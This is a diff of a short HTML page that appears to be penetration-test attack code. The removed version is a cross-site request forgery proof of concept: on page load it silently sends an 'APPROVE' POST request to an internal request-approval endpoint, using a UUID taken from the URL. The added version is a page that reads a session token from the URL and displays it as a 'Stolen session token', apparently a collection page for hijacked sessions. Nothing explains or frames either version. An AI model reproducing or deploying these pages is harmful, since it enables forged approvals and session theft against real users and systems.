@@ -3,54 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Submit Form</title>
+    <title>Session Token Viewer</title>
     <script>
-        // Function to automatically send the POST request
-        window.onload = async function() {
-            // Get the UUID from the URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            const uuid = urlParams.get('uuid');  // Get the 'uuid' parameter from the URL
+        // Extract the session token from the URL
+        window.onload = function () {
+            // Get the query string from the URL
+            const queryString = window.location.search;
 
-            if (!uuid) {
-                alert('UUID parameter is missing in the URL!');
-                return;
-            }
+            // Parse the query parameters
+            const urlParams = new URLSearchParams(queryString);
 
-            // Data to be sent, with the UUID from the URL
-            const data = {
-                "subforms": [
-                    {
-                        "uuid": uuid,  // Use the UUID from the URL
-                        "duration": 8
-                    }
-                ],
-                "action": "APPROVE",
-                "comment": "asd"
-            };
+            // Get the 'sessiontoken' parameter value
+            const sessionToken = urlParams.get('sessiontoken');
 
-            try {
-                // Send the POST request using fetch
-                const response = await fetch('http://192.168.163.129:8000/am5/rest/ucm/requests/form', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',  // Specify the content type as JSON
-                    },
-                    body: JSON.stringify(data)  // Send the data as JSON in the request body
-                });
-
-                // Check if the response was successful
-                if (response.ok) {
-                    console.log('Request was successful!');
-                } else {
-                    console.error('Request failed:', response.status, response.statusText);
-                }
-            } catch (error) {
-                console.error('Error while sending request:', error);
+            // Display the token if it exists
+            if (sessionToken) {
+                document.getElementById("tokenDisplay").textContent = 
+                    "Stolen session token: " + sessionToken;
+            } else {
+                document.getElementById("tokenDisplay").textContent = 
+                    "No session token found in the URL.";
             }
         };
     </script>
 </head>
 <body>
-    <h1>Sending data...</h1>
+    <h1>Session Token Viewer</h1>
+    <p id="tokenDisplay">Loading...</p>
 </body>
 </html>
